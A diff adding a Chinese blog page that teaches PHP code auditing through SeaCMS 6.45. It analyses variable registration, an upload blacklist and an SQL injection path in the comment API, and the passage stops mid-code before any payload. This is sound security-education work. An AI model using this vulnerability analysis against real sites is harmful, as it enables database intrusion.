@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="jelly">
+  <meta name="keywords" content="">
+  
+  <title>通过 SeaCMS 学习 php 代码审计 - jelly&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/doll.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="通过 SeaCMS 学习 php 代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-11 16:14" pubdate>
+        2021年9月11日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      58
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">通过 SeaCMS 学习 php 代码审计</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年9月11日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>SeaCMS 是一套专为不同需求的站长而设计的视频点播系统，也曾爆出过很多经典的漏洞，现在仍在维护，最新版本是 v12.x</p>
+<p>本次代码审计选择的版本是 SeaCMS 6.45，活跃时间大概在2015年，因为这个版本存在很多有趣的漏洞，十分适合我们练手</p>
+<h1 id="0x02-全局分析"><a href="#0x02-全局分析" class="headerlink" title="0x02 全局分析"></a>0x02 全局分析</h1><h2 id="网站首页-index-php"><a href="#网站首页-index-php" class="headerlink" title="网站首页 index.php"></a>网站首页 index.php</h2><blockquote>
+<p>index.php</p>
+</blockquote>
+<p>SeaCMS 和 BlueCMS 的网站首页差不多，加载其他文件处理关键逻辑，然后借助模板输出网页视图。SeaCMS 并没有采用Smarty模板引擎处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> (<span class="hljs-string">&quot;include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span> sea_INC.<span class="hljs-string">&quot;/main.class.php&quot;</span>;<br><span class="hljs-comment">// 输出首页页面</span><br>echoIndex();<br></code></pre></td></tr></table></figure>
+
+<h2 id="common-php"><a href="#common-php" class="headerlink" title="common.php"></a>common.php</h2><blockquote>
+<p>include/common.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件，360webscan.php具有一些安全过滤，mysql.php定义了数据库操控函数，common.func.php含有大量基础函数</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="hljs-string">&#x27;/360safe/360webscan.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>( sea_INC.<span class="hljs-string">&#x27;/inc/mysql.php&#x27;</span> );<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/common.func.php&#x27;</span>);<br><span class="hljs-comment">//检查和注册外部提交的GPC变量是否为系统的全局或配置变量</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span>=&gt;<span class="hljs-variable">$_v</span>)<br>&#123;<br>	<span class="hljs-keyword">if</span>( strlen(<span class="hljs-variable">$_k</span>)&gt;<span class="hljs-number">0</span> &amp;&amp; m_eregi(<span class="hljs-string">&#x27;^(cfg_|GLOBALS)&#x27;</span>,<span class="hljs-variable">$_k</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-variable">$_k</span>]) )<br>	&#123;<br>		<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow!&#x27;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-comment">// 过滤GPC数据，_RunMagicQuotes底层是addslashes()实现</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>&#123;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>&#125;<br><span class="hljs-comment">//加载配置文件，主要为数据库配置文件和系统配置参数，这里就是 cfg_ 变量</span><br><span class="hljs-keyword">require_once</span>(sea_DATA.<span class="hljs-string">&#x27;/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(sea_DATA.<span class="hljs-string">&quot;/config.cache.inc.php&quot;</span>);<br><span class="hljs-comment">//模板的存放目录</span><br><span class="hljs-variable">$cfg_templets_dir</span> = <span class="hljs-string">&#x27;templets&#x27;</span>;<br><span class="hljs-comment">// 文件上传安全处理</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)<br>&#123;<br>	<span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//引入数据库类 sql.class.php 会实例化 $db/$dsql 数据库链接对象，$db-&gt;linkID保存着数据库连接</span><br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/sql.class.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>重点关注common.php 对变量的处理，首先程序禁止GPC变量为系统的全局变量或 <code>cfg_</code> 配置变量，然后全局对GPC数据做addslashes()过滤，没有过滤 <code>$_SERVER</code> 。注意这里通过 <code>$$</code> 的方式直接把GPC的变量注册到系统中，可能会造成变量覆盖漏洞的问题</p>
+</li>
+<li><p>加载的 common.func.php 含有大量的基础函数，其中还有 RemoveXSS() 这种方法过滤 xss 代码，需要调用才能实现</p>
+</li>
+<li><p>注意到SeaCMS 对文件上传也有全局处理，跟踪下这个文件 include/uploadsafe.inc.php</p>
+<p>这里通过黑名单方式禁用了很多以文件后缀，如果服务器只解析 php 后缀的文件，我们则很难绕过这个</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cfg_not_allowall</span> = <span class="hljs-string">&quot;php|pl|cgi|asp|asa|cer|aspx|jsp|php3|shtm|shtml&quot;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span>=&gt;<span class="hljs-variable">$_value</span>)<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (m_eregi(<span class="hljs-string">&quot;\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !m_ereg(<span class="hljs-string">&quot;\.&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )<br>    &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="后台入口-index-php"><a href="#后台入口-index-php" class="headerlink" title="后台入口 index.php"></a>后台入口 index.php</h2><p>前台的功能点一般比较少，很多时候需要通过后台的功能点才能获取到shell，bluecms就是通过后台获取的shell。下面分析一下后台入口文件 index.php 的流程</p>
+<blockquote>
+<p>admin/index.php</p>
+</blockquote>
+<p>下面是 admin/index.php 的全部代码，写的十分简单，可以看到具体逻辑还是交给了加载的文件，我们还需要分析加载的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// config.php 会加载common.php对外部数据做全局过滤，还会加载check.admin.php做身份验证，是后台的核心文件</span><br><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br><span class="hljs-comment">// inc_menu.php 存有后台菜单的大量信息，将会在index.htm中显示</span><br><span class="hljs-keyword">require_once</span>(sea_ADMIN.<span class="hljs-string">&#x27;/inc_menu.php&#x27;</span>);<br><span class="hljs-variable">$defaultIcoFile</span> = sea_ROOT.<span class="hljs-string">&#x27;/data/admin/quickmenu.txt&#x27;</span>;<br><span class="hljs-variable">$myIcoFile</span> = sea_ROOT.<span class="hljs-string">&#x27;/data/admin/quickmenu-&#x27;</span>.<span class="hljs-variable">$cuserLogin</span>-&gt;getUserID().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$myIcoFile</span>)) &#123;<br>		<span class="hljs-variable">$myIcoFile</span> = <span class="hljs-variable">$defaultIcoFile</span>;<br>&#125;<br><span class="hljs-comment">// 后台的视图输出都在该模板中</span><br><span class="hljs-keyword">include</span>(sea_ADMIN.<span class="hljs-string">&#x27;/templets/index.htm&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="admin-config-php"><a href="#admin-config-php" class="headerlink" title="admin/config.php"></a>admin/config.php</h3><blockquote>
+<p>admin/config.php</p>
+</blockquote>
+<ul>
+<li>加载了和首页index.php相同的common.php，这里能知道 BlueCMS 后台也做了全局安全过滤和其他的操作</li>
+<li>加载了check.admin.php，该类定义了userLogin类，用于用户的身份认证，所以加载了 config.php 的文件基本可以认定是需要登陆后台。SeaCMS 主要通过session来认证用户身份，没有通过认证的将会跳转到登陆页面。因为我没有看出SeaCMS的认证缺陷，这里就不多分析具体的逻辑了</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载基础文件</span><br><span class="hljs-keyword">require_once</span>(sea_ADMIN.<span class="hljs-string">&quot;/../include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&quot;/check.admin.php&quot;</span>);<br><span class="hljs-comment">//检验用户登录状态</span><br><span class="hljs-variable">$cuserLogin</span> = <span class="hljs-keyword">new</span> userLogin();<br><span class="hljs-variable">$hashstr</span>=md5(<span class="hljs-variable">$cfg_dbpwd</span>.<span class="hljs-variable">$cfg_dbname</span>.<span class="hljs-variable">$cfg_dbuser</span>);<span class="hljs-comment">//构造session安全码</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cuserLogin</span>-&gt;getUserID()==-<span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hashstr&#x27;</span>] !== <span class="hljs-variable">$hashstr</span>)<br>&#123;<br>	header(<span class="hljs-string">&quot;location:login.php?gotopage=&quot;</span>.urlencode(<span class="hljs-variable">$EkNowurl</span>));<br>	<span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-comment">// 定义很多的方法</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeTopicSelect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"><span class="hljs-title">function</span> <span class="hljs-title">getTemplateType</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  ……</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="后台页面的视图"><a href="#后台页面的视图" class="headerlink" title="后台页面的视图"></a>后台页面的视图</h3><blockquote>
+<p>admin/templets/index.htm</p>
+</blockquote>
+<p>SeaCMS 也有用到 iframe 让 index.php 可以成为入口文件，和BlueCMS不同的是，SeaCMS在菜单栏上并没有使用iframe，而是使用大量php代码+HTML代码来实现，看起来十分困难</p>
+<p>从这里也能感受到早期CMS在视图呈现上的常用方式，它们通常在php代码中保存要输出的信息，然后通过加载一个htm的静态页面，在静态页面中穿插部分php代码，从而呈现出视图。看到这也不免期待使用 MVC 架构的程序实现视图的方案</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;90&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span><br>            # 包括logo，pannel，nav等，其中nav为上部菜单(导航栏)，主要显示inc_menu.php中的数据<br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#左部菜单和footer，主要显示inc_menu.php中的数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">valign</span>=<span class="hljs-string">&quot;top&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;maincontent&quot;</span>&gt;</span>#主题内容通过iframe实现<br>            <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index_body.php&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;I2&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;yes&quot;</span></span><br><span class="hljs-tag">                    <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;overflow: visible;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x03-挖洞记录"><a href="#0x03-挖洞记录" class="headerlink" title="0x03 挖洞记录"></a>0x03 挖洞记录</h1><p>Seacms 前台除了有一个代码执行的漏洞，没有发现其他什么漏洞，大多数漏洞都在后台。因为前台的代码执行漏洞有点复杂，我放到最后解析</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h3><blockquote>
+<p>comment/api/index.php</p>
+</blockquote>
+<p>这个前台sql注入稍微有点复杂，但代码审计的关键是一击致命，下面放出一眼应该看出存在漏洞的两行代码:</p>
+<p>我们知道addslashs()主要是过滤引号的sql注入，其中<code>$type</code>, <code>$ids</code>并没有被引号包裹，如果我们找出这两个参数可控，那么这个sql注入就可利用了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="hljs-subst">$type</span> AND id in (<span class="hljs-subst">$ids</span>) ORDER BY id DESC&quot;</span>;<br>    <span class="hljs-variable">$dsql</span>-&gt;setQuery(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+
+<p>然后再细看代码：</p>
+<ul>
+<li><code>$type</code>  默认为1，而且会经过 is_numeric() 数字类参数的判断，故该参数不能利用，同样的<code>$id</code>，<code>$page</code>也只能控制为数字类的参数</li>
+<li><code>$page&lt;2</code> 可能会提前退出程序，所以最好控制 <strong>$page&gt;=2</strong></li>
+<li>最后最执行ReadData()函数，跟进该函数，当 <strong>$id&gt;0</strong>（来自$gid）时会调用Readmlist(), Readrlist()</li>
+<li>传入 Readrlist() 的参数来自 <code>$ids = $x = implode(&#39;,&#39;,$rlist)</code>，即 <code>$rlist</code>，该参数可控，implode()是把数组参数转换为字符串， 所以 <code>$ids</code> 可控，那么上面的代码漏洞存在</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;../../include/common.php&quot;</span>);<br><span class="hljs-variable">$id</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$gid</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$gid</span>)) ? <span class="hljs-variable">$gid</span> : <span class="hljs-number">0</span>;<br><span class="hljs-variable">$page</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$page</span>)) ? <span class="hljs-variable">$page</span> : <span class="hljs-number">1</span>;<br><span class="hljs-variable">$type</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$type</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$type</span>)) ? <span class="hljs-variable">$type</span> : <span class="hljs-number">1</span>;<br><span class="hljs-comment">//缓存第一页的评论</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span>&lt;<span class="hljs-number">2</span>)<br>&#123;<br>	<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$jsoncachefile</span>))<br>	&#123;<br>		<span class="hljs-variable">$json</span>=LoadFile(<span class="hljs-variable">$jsoncachefile</span>);<br>		<span class="hljs-keyword">die</span>(<span class="hljs-variable">$json</span>);<br>	&#125;<br>&#125;<br><span class="hljs-variable">$h</span> = ReadData(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span>);<br>……<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ReadData</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$type</span>,<span class="hljs-variable">$pCount</span>,<span class="hljs-variable">$rlist</span>;<br>	<span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$page</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-variable">$type</span>,<span class="hljs-variable">$id</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span>&gt;<span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-variable">$ret</span>[<span class="hljs-number">0</span>] = Readmlist(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$ret</span>[<span class="hljs-number">4</span>]);<br>		<span class="hljs-variable">$ret</span>[<span class="hljs-number">3</span>] = <span class="hljs-variable">$pCount</span>;<br>    <span class="hljs-comment">// $x来自$rlist，然后传入Readrlist()</span><br>		<span class="hljs-variable">$x</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$rlist</span>);<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$x</span>))<br>		&#123;<br>			<span class="hljs-variable">$ret</span>[<span class="hljs-number">1</span>] = Readrlist(<span class="hljs-variable">$x</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>);<br>		&#125;<br>	&#125;	<br>	<span class="hljs-variable">$readData</span> = FormatJson(<span class="hljs-variable">$ret</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$readData</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Readrlist</span>(<span class="hljs-params"><span class="hljs-variable">$ids</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$size</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$dsql</span>,<span class="hljs-variable">$type</span>;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="hljs-subst">$type</span> AND id in (<span class="hljs-subst">$ids</span>) ORDER BY id 